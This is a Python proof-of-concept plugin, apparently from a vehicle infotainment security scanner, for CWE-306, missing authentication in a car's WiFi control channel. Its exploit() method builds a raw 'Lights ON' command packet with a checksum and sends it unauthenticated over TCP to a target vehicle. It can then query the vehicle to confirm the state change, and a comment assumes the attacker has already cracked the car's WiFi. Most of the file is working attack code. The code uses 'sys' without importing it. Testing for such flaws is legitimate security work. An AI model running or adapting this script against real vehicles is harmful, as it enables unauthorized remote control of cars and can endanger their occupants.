#!/usr/bin/env python3
"""
PoC Name: WiFi Unauthenticated Vehicle Control
Identifier: CWE-306
Component: Wireless Stack
Category: Wireless
Severity: High
CVSS: 7.5
Description: 通过WiFi发送未认证车辆控制命令
Prerequisites: 支持Monitor模式的无线网卡及scapy环境
Usage: python3 08_CWE_306_WiFi_Unauth_Vehicle_Ctrl_Active_Validation.py <target_ip> <target_port>
"""
from __future__ import annotations

import socket
import binascii
from iv_plugin_base import IVIVulnerabilityPlugin
VULN = {
    "id":             0,
    "cve":            "CWE-306",
    "year":           306,
    "domain":         "wireless",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "WiFi Unauth Vehicle Ctrl",
    "source_url":     "https://cwe.mitre.org/data/definitions/306.html",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://cwe.mitre.org/data/definitions/306.html"],
    "signature_tokens": ["CWE-306"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CWE-306 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CWE-306") if vuln else "CWE-306",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class MitsubishiWiFiExploit(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-008"
    meta_poc_name = 'CWE-306 WiFi Unauth Vehicle Ctrl Active Validation'
    meta_cve_id = "CWE-306"
    meta_source_url = "https://cwe.mitre.org/data/definitions/306.html"
    meta_references = ['https://cwe.mitre.org/data/definitions/306.html']
    meta_severity = "High"
    meta_protocol = "wifi"
    meta_profiles = ["wifi"]
    meta_target_os = ["all"]
    meta_required_params = ["target_ip", "target_port"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        # 假设攻击者已破解Wi-Fi并连接到车辆AP
        if not self.target_ip or not self.target_port:
            raise RuntimeError("需要提供 target_ip 和 target_port")
        self.followup_query_hex = self.params.get("followup_query_hex")
        self.expected_state_hex = self.params.get("expected_state_hex")
        return True

    def _calculate_crc(self, data):
        return sum(data) % 256

    def _exchange(self, payload):
        sock = self.create_connection('tcp')
        if not sock:
            return None, "Unable to establish control channel"
        try:
            sock.sendall(payload)
            response = sock.recv(1024)
            return response, None
        finally:
            sock.close()

    def exploit(self):
        # 示例：开启车灯指令
        # 实际指令码需参考逆向文档
        msg = bytearray()
        msg.append(0x6F) # Type: App to Car
        msg.append(0x04) # Length
        msg.append(0x00) # Zero
        msg.append(0x0A) # Command: Lights ON
        msg.append(0x02) # Parameter
        
        # 计算并追加 CRC
        crc = self._calculate_crc(msg)
        msg.append(crc)
        
        self.logger.info(f"发送指令包: {msg.hex()}")

        response, error = self._exchange(bytes(msg))
        if error:
            self.results["vulnerable"] = False
            self.results["evidence"] = error
            return self.results

        self.logger.info(f"收到响应: {response.hex()}")

        if self.followup_query_hex and self.expected_state_hex:
            followup = binascii.unhexlify(self.followup_query_hex)
            state_resp, error = self._exchange(followup)
            if error:
                self.results["vulnerable"] = False
                self.results["evidence"] = f"Control command sent, but follow-up query failed: {error}"
                return self.results
            expected = binascii.unhexlify(self.expected_state_hex)
            if expected in state_resp:
                self.results["vulnerable"] = True
                self.results["evidence"] = (
                    f"Unauthenticated control command accepted and follow-up state query confirmed change. "
                    f"cmd_resp={response.hex()} state_resp={state_resp.hex()}"
                )
            else:
                self.results["vulnerable"] = False
                self.results["evidence"] = (
                    f"Control response received, but follow-up state query did not confirm the expected change. "
                    f"cmd_resp={response.hex()} state_resp={state_resp.hex()}"
                )
            return self.results

        self.results["vulnerable"] = False
        self.results["evidence"] = (
            f"Control response received ({response.hex()}), but no follow-up query/expected_state was provided, "
            "so the unauthenticated state change was not strictly verified."
        )
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 08_CWE_306_WiFi_Unauth_Vehicle_Ctrl_Active_Validation.py <target_ip> <target_port>")
        sys.exit(1)
    plugin = MitsubishiWiFiExploit({"target_ip": sys.argv[1], "target_port": sys.argv[2]})
    plugin.run_verify()
